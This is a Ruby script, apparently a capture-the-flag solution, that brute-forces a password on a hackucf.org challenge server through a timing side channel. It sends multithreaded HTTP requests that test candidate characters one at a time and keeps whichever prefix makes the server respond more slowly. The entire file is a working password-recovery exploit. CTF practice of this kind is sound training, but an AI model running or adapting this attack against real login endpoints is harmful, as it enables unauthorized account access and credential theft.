#!/usr/bin/ruby

require 'httpclient'


puts "\nstarting up..\n"


$clnt = HTTPClient.new() # see the github for ruby-httpclient

def checkWin(body) # checks if we've found the key or not
	if body.index('WRONG') == nil then
		return true
	else
		return false
	end
end

def getTime(body) # parses time from body of req
	if(checkWin(body)) then
		return -1
	end

	tis = body.index('<time>') + 6 # TimeIndexStart
	tie = body.index('</time>')    # TimeIndexEnd

	body[tis..tie].to_f
end

def makeReq(passwd) # synchronously makes a request and returns the time and pass (from the body of the req)
	body = $clnt.get('http://ctf.hackucf.org:4000/bad_code/bad_code.php', {'passwd' => passwd}).content
	time = getTime(body)
	return time, passwd
end

def guessPart(base, expectedTime) # uses 6 threads by default, ( my comp only has 6 :/ ) 
				  # checks from 32.chr -> 127.chr
	threads = 6 # just plopped in as a variable since this script should be run *too* much
	ind = 32 - threads
	ttime = -1

	while ind < 127 and ttime < expectedTime
		ind += threads # structured with this at the top so it doesnt up ind on loop exit
		threadHandles = Array.new(threads)

		threads.times do |i| # send off a thread for each (it has to be done this way, while loops break!)
			tpasswd = base + (ind+i).chr
			threadHandles[i] = Thread.new {
				Thread.current["i"] = i
				Thread.current["time"], Thread.current["passwd"] = makeReq(tpasswd)
			}
		end

		#join threads, and collect the results, so that i can step through then synchronously
		threadHandles.each { |thrd| 
			thrd.join
			print thrd["time"], " @ ", thrd["passwd"], "\n"
			if thrd["time"] > expectedTime then
				return guessPart(thrd["passwd"], expectedTime + 0.0199)
			else
				if thrd["time"] == -1 then
					return thrd["passwd"]
				end
			end
		}
	end
	if ind > 127 then
		return '(COULDNT FIND PASS, SORRY)'
	end
end

pass = guessPart('', 0.028)
print "\nPasswd found!\n", pass, "\nExiting...\n"

